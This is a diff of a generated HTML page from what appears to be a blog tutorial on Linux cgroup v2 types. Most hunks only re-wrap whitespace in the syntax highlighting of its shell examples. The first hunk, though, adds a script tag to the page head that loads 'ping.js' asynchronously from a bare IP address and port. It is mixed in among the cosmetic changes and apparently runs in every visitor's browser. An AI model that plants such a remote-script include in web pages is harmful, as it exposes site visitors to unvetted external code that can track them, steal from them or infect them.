@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -108,18 +110,18 @@ $ test -d /sys/fs/cgroup/test && echo "cgroup test/ already created!"     # byex
 <p>Let’s get into!</p>
 <h3 id="mount-point">Mount point</h3>
 <p>To access the control interface of <code>cgroup</code> we need to have mounted the (pseudo) file system.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ mount <span class="p">|</span> grep cgroup                               <span class="c1"># byexample: +fail-fast</span>
-cgroup2 on /sys/fs/cgroup <span class="nb">type</span> cgroup2 <span class="o">(</span>&lt;...&gt;<span class="o">)</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>cgroup<span class="w">                               </span><span class="c1"># byexample: +fail-fast</span>
+cgroup2<span class="w"> </span>on<span class="w"> </span>/sys/fs/cgroup<span class="w"> </span><span class="nb">type</span><span class="w"> </span>cgroup2<span class="w"> </span><span class="o">(</span>&lt;...&gt;<span class="o">)</span>
 </code></pre></div>
 
 <p>In my case it is mounted on <code>/sys/fs/cgroup</code>; in some other distros it is mounted under <code>/sys/fs/cgroup/unified</code>: just check where the (pseudo) <code>cgroup2</code> file system is mounted.</p>
 <h3 id="creating-new-cgroups">Creating new cgroups</h3>
 <p>A hierarchy is divided into cgroups and those into more sub cgroups.</p>
 <p>These can be easily created just creating subfolders inside the mount point.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="nb">cd</span> /sys/fs/cgroup
-$ mkdir -p <span class="nb">test</span>
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/sys/fs/cgroup
+$<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="nb">test</span>
 
-$ ls -1 test/
+$<span class="w"> </span>ls<span class="w"> </span>-1<span class="w"> </span>test/
 &lt;...&gt;
 cgroup.procs
 &lt;...&gt;
@@ -130,25 +132,25 @@ cgroup.type
 
 <p><code>cgroup.procs</code> lists the processes’ ids that belongs to the <code>test/</code> cgroup and, as you may guessed, <code>cgroup.threads</code> lists the threads’ ids of the processes in the cgroup.</p>
 <p>No process is in my <code>test/</code> cgroup so both files are empty.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ cat test/cgroup.procs
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>cat<span class="w"> </span>test/cgroup.procs
 
-$ cat test/cgroup.threads
+$<span class="w"> </span>cat<span class="w"> </span>test/cgroup.threads
 </code></pre></div>
 
 <p>At the moment (kernel 5.17) there is no limit on how much nested a cgroup can be: we can create as many (sub) cgroups as we may please.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ mkdir -p test/cg1
-$ mkdir -p test/cg2
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>test/cg1
+$<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>test/cg2
 </code></pre></div>
 
 <h2 id="domain-cgroups"><code>domain</code> cgroups</h2>
 <p>The file <code>cgroup.type</code> says which kind of cgroup we have:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ cat test/cgroup.type
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>cat<span class="w"> </span>test/cgroup.type
 domain
 
-$ cat test/cg1/cgroup.type
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/cgroup.type
 domain
 
-$ cat test/cg2/cgroup.type
+$<span class="w"> </span>cat<span class="w"> </span>test/cg2/cgroup.type
 domain
 </code></pre></div>
 
@@ -170,27 +172,27 @@ The term <em>slice</em> is borrowed from <code>systemd</code>: <code>systemd</co
 <p>The domain threaded still operates at the process level but further divisions are for <em>partitioning the threads</em> of the processes in the domain.</p>
 <p>These divisions are neither normal <code>domain</code> nor <code>domain threaded</code>, these are <code>threaded</code> cgroups.</p>
 <p>Let’s create first a few normal <code>domain</code>s:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ mkdir -p test/cg1/t1
-$ cat test/cg1/t1/cgroup.type
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>test/cg1/t1
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t1/cgroup.type
 domain
 
-$ mkdir -p test/cg1/t2
-$ cat test/cg1/t2/cgroup.type
+$<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>test/cg1/t2
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t2/cgroup.type
 domain
 </code></pre></div>
 
 <p>Now we turn one of the domains into a <code>threaded</code> cgroup and that will automatically turn <em>its parent</em> into a <code>domain threaded</code>:</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="c1"># The parent cgroup, before</span>
-$ cat test/cg1/cgroup.type
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="c1"># The parent cgroup, before</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/cgroup.type
 domain
 
-$ <span class="nb">echo</span> <span class="s2">&quot;threaded&quot;</span> &gt; test/cg1/t1/cgroup.type
-$ cat test/cg1/t1/cgroup.type
+$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;threaded&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>test/cg1/t1/cgroup.type
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t1/cgroup.type
 threaded
 
-$ <span class="c1"># The parent cgroup, after</span>
-$ cat test/cg1/cgroup.type
-domain threaded
+$<span class="w"> </span><span class="c1"># The parent cgroup, after</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/cgroup.type
+domain<span class="w"> </span>threaded
 </code></pre></div>
 
 <p>While we can still use <code>test/cg1/</code> to control the resources of the processes that belong to the group, we can now use <code>test/cg1/t1/</code> and <code>test/cg1/t2/</code> to distribute the resources differently among the <em>threads</em> of the processes.</p>
@@ -202,72 +204,72 @@ domain threaded
 <h2 id="domain-invalid"><code>domain invalid</code></h2>
 <p>We made <code>test/cg1/t1/</code> into a <code>threaded</code> and that turned its parent <code>test/cg1/</code> into a <code>domain threaded</code>.</p>
 <p>What happen with the sibling of <code>test/cg1/t1/</code>, the <code>test/cg1/t2/</code> cgroup?</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="c1"># The parent cgroup</span>
-$ cat test/cg1/cgroup.type
-domain threaded
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="c1"># The parent cgroup</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/cgroup.type
+domain<span class="w"> </span>threaded
 
-$ <span class="c1"># The threaded cgroup</span>
-$ cat test/cg1/t1/cgroup.type
+$<span class="w"> </span><span class="c1"># The threaded cgroup</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t1/cgroup.type
 threaded
 
-$ <span class="c1"># Its sibling</span>
-$ cat test/cg1/t2/cgroup.type
-domain invalid
+$<span class="w"> </span><span class="c1"># Its sibling</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t2/cgroup.type
+domain<span class="w"> </span>invalid
 </code></pre></div>
 
 <p><code>test/cg1/t2/</code> is in an invalid state because we said that any subfolder of a <code>domain threaded</code> must be of the <code>threaded</code> kind.</p>
 <p>By default <code>test/cg1/t2/</code> was <code>domain</code> so this is incompatible.</p>
 <p>The same would happen if we create a new cgroup, because the default is of type <code>domain</code>, the resulting will be invalid too.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="c1"># The parent cgroup</span>
-$ cat test/cg1/cgroup.type
-domain threaded
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="c1"># The parent cgroup</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/cgroup.type
+domain<span class="w"> </span>threaded
 
-$ <span class="c1"># Create a new cgroup</span>
-$ mkdir test/cg1/t3
+$<span class="w"> </span><span class="c1"># Create a new cgroup</span>
+$<span class="w"> </span>mkdir<span class="w"> </span>test/cg1/t3
 
-$ <span class="c1"># The default type is always &#39;domain&#39; so it makes</span>
-$ <span class="c1"># it invalid here inside of the &#39;domain threaded&#39;</span>
-$ cat test/cg1/t3/cgroup.type
-domain invalid
+$<span class="w"> </span><span class="c1"># The default type is always &#39;domain&#39; so it makes</span>
+$<span class="w"> </span><span class="c1"># it invalid here inside of the &#39;domain threaded&#39;</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t3/cgroup.type
+domain<span class="w"> </span>invalid
 </code></pre></div>
 
 <p>We can turn these invalid domains into <code>threaded</code> cgroups just writing in their <code>cgroup.type</code> the value <code>threaded</code>.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="nb">echo</span> <span class="s1">&#39;threaded&#39;</span> &gt; test/cg1/t2/cgroup.type
-$ cat test/cg1/t2/cgroup.type
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;threaded&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>test/cg1/t2/cgroup.type
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t2/cgroup.type
 threaded
 </code></pre></div>
 
 <h2 id="life-time-of-a-domain-threaded">Life time of a <code>domain threaded</code></h2>
 <p>As we saw earlier, a <code>domain threaded</code> can be created by making one of its (sub) cgroups a <code>threaded</code> cgroup.</p>
 <p>It is <em>not</em> possible to write <code>domain threaded</code> neither to change the type of a <code>domain invalid</code> nor to change a <code>domain</code> into a <code>domain threaded</code>.</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="nb">echo</span> <span class="s1">&#39;domain threaded&#39;</span> &gt; test/cg1/t3/cgroup.type
-bash: echo: write error: Invalid argument
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;domain threaded&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>test/cg1/t3/cgroup.type
+bash:<span class="w"> </span>echo:<span class="w"> </span>write<span class="w"> </span>error:<span class="w"> </span>Invalid<span class="w"> </span>argument
 
-$ <span class="nb">echo</span> <span class="s1">&#39;domain threaded&#39;</span> &gt; test/cg2/cgroup.type
-bash: echo: write error: Invalid argument
+$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;domain threaded&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>test/cg2/cgroup.type
+bash:<span class="w"> </span>echo:<span class="w"> </span>write<span class="w"> </span>error:<span class="w"> </span>Invalid<span class="w"> </span>argument
 
-$ cat test/cg1/t3/cgroup.type
-domain invalid
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t3/cgroup.type
+domain<span class="w"> </span>invalid
 
-$ cat test/cg2/cgroup.type
+$<span class="w"> </span>cat<span class="w"> </span>test/cg2/cgroup.type
 domain
 </code></pre></div>
 
 <p>The only way to get a <code>domain threaded</code> is to have a (sub) cgroup of <code>threaded</code> type.</p>
 <p>The same restriction works on the way back: to make a <code>domain threaded</code> back to a <code>domain</code> you must delete the (sub) <code>threaded</code> cgroups (changing them to <code>domain</code> does not work).</p>
-<div class="highlight-candombe"><pre><span></span><code>$ <span class="c1"># this doen&#39;t work</span>
-$ <span class="nb">echo</span> <span class="s1">&#39;domain&#39;</span> &gt; test/cg1/t1/cgroup.type
-&lt;...&gt;write error: Invalid argument
+<div class="highlight-candombe"><pre><span></span><code>$<span class="w"> </span><span class="c1"># this doen&#39;t work</span>
+$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;domain&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>test/cg1/t1/cgroup.type
+&lt;...&gt;write<span class="w"> </span>error:<span class="w"> </span>Invalid<span class="w"> </span>argument
 
-$ rmdir test/cg1/t1
-$ rmdir test/cg1/t2
+$<span class="w"> </span>rmdir<span class="w"> </span>test/cg1/t1
+$<span class="w"> </span>rmdir<span class="w"> </span>test/cg1/t2
 
-$ <span class="c1"># back to &quot;normal&quot; domain</span>
-$ cat test/cg1/cgroup.type
+$<span class="w"> </span><span class="c1"># back to &quot;normal&quot; domain</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/cgroup.type
 domain
 
-$ <span class="c1"># not longer domain invalid</span>
-$ cat test/cg1/t3/cgroup.type
+$<span class="w"> </span><span class="c1"># not longer domain invalid</span>
+$<span class="w"> </span>cat<span class="w"> </span>test/cg1/t3/cgroup.type
 domain
 </code></pre></div>
 
